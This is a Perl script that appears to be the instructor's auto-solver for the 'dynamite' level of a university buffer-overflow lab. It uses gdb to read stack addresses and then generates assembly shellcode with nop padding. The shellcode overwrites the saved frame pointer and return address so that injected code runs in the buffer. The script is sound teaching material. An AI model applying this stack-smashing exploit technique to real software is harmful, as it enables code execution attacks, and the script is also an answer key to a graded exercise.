#!/usr/bin/perl 
#!/usr/local/bin/perl

use Getopt::Std;
use lib "../grade";
use config;

#######################################################################
# boom.pl - automatically solves a buffer bomb for dynamite level
#
# Copyright (c) 2002, R. Bryant and D. O'Hallaron, All rights reserved.
# May not be used, modified, or copied without permission.
#
#######################################################################

$| = 1; # autoflush output on every print statement

#
# usage - print help message and terminate
#
sub usage 
{
    printf STDERR "$_[0]\n";
    printf STDERR "Usage: $0 [-h] -t <teamname>\n";
    printf STDERR "Options:\n";
    printf STDERR "  -t <teamname> Team name\n";
    printf STDERR "  -s            Submit solution to grading server\n";
    printf STDERR "  -h            Print this message\n";
    die "\n";
}

$flags = "";

# Get specified team and executable
getopts('hst:');
if ($opt_h) {
    usage();
}

if (!$opt_t) {
    usage("Missing team name (-t)\n");
}

if ($opt_s) {
    $flags = "-s";
}

$team = $opt_t;

# Make sure the makecookie binary is there 
system("cd $BINDIR; make > /dev/null 2>&1"); 

# Solve buffer bomb for specified team
$cookie = `$BINDIR/makecookie $team`;
chomp($cookie);

# Run GDB to extract runtime information
$gdbfile = "boom-$team.gdb";
open(GDB, ">$gdbfile") || die "Can't open GDB file $gdbfile\n";

# The gdb script runs the program far enough into getbuf that register
# %eax holds the value of buf.
# It then extracts:
#   $rp: The value of the return pointer
#   $ebpval: The old value of %ebp
#   $buf: The address of buf
#   $nopcount: The amount of padding to insert to make the buffer overflow
#   and overwrite the return pointer

print GDB <<GDBSTUFF;
break getbuf
run -t $team
stepi 4
print /x *((int*)\$ebp+1)
print /x *(int*)\$ebp
print /x \$eax
print /d (\$ebp-\$eax-12)
quit
GDBSTUFF

close GDB;
$gdbout = `gdb -nw $EXECUTABLE -x $gdbfile | grep \"=\"`
    || die "Couldn't run gdb with batch file $gdbfile\n";

$gdbout =~ s/\$[0-9]* = //g;
($rp, $ebpval, $buf, $nopcount) = split(/\n/, $gdbout);

$asfile = "boom-$team.s";
open(AS, ">$asfile") || die "Can't open assembly code file $asfile\n";

# Generate assembly code

print AS <<ASTUFF1;
	pushl \$ $rp	# Put correct return pointer back on stack
	movl \$ $cookie,%eax	# Alter return value
	ret			# Re-execute return
ASTUFF1
for ($i = 0; $i < $nopcount; $i++) {
    # Insert padding
    print AS "\tnop\n";
}

print AS <<ASTUFF2;
.align 4			# Round up to multiple of 4
	.long $ebpval	# Saved value of %ebp
	.long $buf	# Location of buf
ASTUFF2

close AS;
